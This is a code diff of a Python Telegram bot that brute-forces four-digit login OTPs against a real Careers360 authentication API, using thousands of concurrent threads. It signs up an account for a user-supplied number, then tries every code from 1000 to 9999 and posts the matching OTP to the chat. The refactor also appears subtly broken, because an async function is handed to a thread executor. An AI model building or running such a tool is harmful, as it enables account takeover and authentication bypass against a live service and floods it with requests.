@@ -1,11 +1,8 @@
 import requests
-import time
 import asyncio
 import concurrent.futures
 import threading
 from flask import Flask
-from fastapi import FastAPI
-import uvicorn
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
@@ -20,14 +17,12 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-# Flask app for Koyeb deployment
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def home():
     return "Bot is Running!"
 
-# Function to run Flask on a separate thread
 def run_flask():
     flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)
 
@@ -54,13 +49,11 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
-    if otp_response.status_code == 200 and otp_response.json().get("result"):
-        sent_message = await bot.send_message(chat_id, "✅ OTP Sent Successfully! 📩")
-        time.sleep(2)
-        await bot.delete_message(chat_id, sent_message.message_id)
-    else:
+    if otp_response.status_code != 200 or not otp_response.json().get("result"):
         await bot.send_message(chat_id, "❌ OTP Sending Failed.")
         return
+
+    await bot.send_message(chat_id, "✅ OTP Sent Successfully! 📩")
 
     # Signup
     signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
@@ -86,24 +79,19 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
-    if signup_response.status_code == 200 and signup_response.json().get("result"):
-        user_uuid = signup_response.json()["data"].get("user_uuid")
-        uuid_message = await bot.send_message(chat_id, f"✅ Signup Successful! UUID: `{user_uuid}`", parse_mode="Markdown")
-        time.sleep(2)
-        await bot.delete_message(chat_id, uuid_message.message_id)
-    else:
+    if signup_response.status_code != 200 or not signup_response.json().get("result"):
         await bot.send_message(chat_id, "❌ Signup Failed.")
         return
 
-    # Login Brute Force OTP
+    user_uuid = signup_response.json()["data"].get("user_uuid")
+    await bot.send_message(chat_id, f"✅ Signup Successful! UUID: `{user_uuid}`", parse_mode="Markdown")
+
+    # Login OTP Brute Force
     login_url = "https://backend-cus.careers360.com/api/1/cus/login"
     found_otp = None
-    checked_otps = 0
 
-    progress_message = await bot.send_message(chat_id, "🔄 Checking OTPs... (0 checked)")
-
-    def try_otp(otp):
-        nonlocal found_otp, checked_otps
+    async def try_otp(otp):
+        nonlocal found_otp
         if found_otp:
             return None
 
@@ -121,30 +109,28 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         login_response = requests.post(login_url, json=login_data, headers=HEADERS)
 
-        checked_otps += 1  # Increment OTP count
-
         if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
             found_otp = otp
             return otp
 
         return None
 
-    async def check_otp_with_updates():
-        nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
-            future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
+    async def check_otp():
+        nonlocal found_otp
+        with concurrent.futures.ThreadPoolExecutor(max_workers=9000) as executor:
+            loop = asyncio.get_event_loop()
+            futures = [loop.run_in_executor(executor, try_otp, otp) for otp in range(1000, 10000)]
 
-            for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
+            for future in asyncio.as_completed(futures):
                 if found_otp:
                     executor.shutdown(wait=False)
                     break
+                result = await future
+                if result:
+                    found_otp = result
+                    break
 
-                # Edit the message every 500 OTPs checked
-                if checked_otps % 100 == 0:
-                    await progress_message.edit_text(f"🔄 Checking OTPs... ({checked_otps} checked)")
-
-    await check_otp_with_updates()
-    await bot.delete_message(chat_id, progress_message.message_id)
+    await check_otp()
 
     if found_otp:
         await bot.send_message(chat_id, f"✅ Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
@@ -162,10 +148,7 @@ async def main():
     await asyncio.Event().wait()
 
 if __name__ == "__main__":
-    # Start Flask in a separate thread
     threading.Thread(target=run_flask, daemon=True).start()
-
-    # Start Telegram bot
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(main())
